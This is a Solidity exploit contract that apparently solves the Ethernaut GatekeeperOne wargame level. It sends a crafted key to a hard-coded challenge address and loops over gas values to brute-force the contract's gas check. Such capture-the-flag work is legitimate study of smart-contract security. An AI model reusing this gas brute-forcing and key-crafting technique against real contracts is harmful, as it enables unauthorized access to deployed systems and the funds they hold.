// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/math/SafeMath.sol";
import "./gatekeeperone.sol";
import "hardhat/console.sol";


contract HackGatekeeperOne {
  
  GatekeeperOne gateKeeperOne = GatekeeperOne(0xdE7671A9eDaC21E8BD237009b6046191B193d26D);

  function hack() external returns(bool){
      bytes8 val = 0x0000000100008ee5; // last 4 hex of the sender addy
      for (uint i=0; i<9000;i++){
        (bool s, ) = address(gateKeeperOne).call{gas:819100 + i}(abi.encodeWithSelector(gateKeeperOne.enter.selector, val));
        if(s){
          return true;
        }
      }
      return false;
      
  }
}